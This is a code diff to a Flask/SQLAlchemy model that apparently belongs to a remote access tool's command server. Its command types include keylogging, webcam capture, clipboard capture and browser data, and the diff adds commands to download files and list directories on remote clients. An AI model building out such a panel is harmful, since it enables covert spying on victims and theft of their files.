@@ -11,6 +11,8 @@ class CommandType(Enum):
     KEYLOGGER = "keylogger"
     PAPIER = "papier"
     WEBCAM = "webcam"
+    DOWNLOAD_FILE = "download_file"
+    DIRECTORY_LISTING = "list_directory"
 
 
 class Command(db.Model):
@@ -18,7 +20,8 @@ class Command(db.Model):
     type = db.Column(db.Enum(CommandType), nullable=False)
     browser_name = db.Column(db.String(64), nullable=True)
     client_id = db.Column(db.Integer, db.ForeignKey('client.id'), nullable=False)
-    file_path = db.Column(db.String(256), unique=True, nullable=False)
+    file_path = db.Column(db.String(256), nullable=True)
+    dir_path = db.Column(db.String(256), nullable=True)
     date_created = db.Column(db.DateTime, nullable=False, default=datetime.now)
     date_updated = db.Column(db.DateTime, nullable=False, default=datetime.now, onupdate=datetime.now)
 
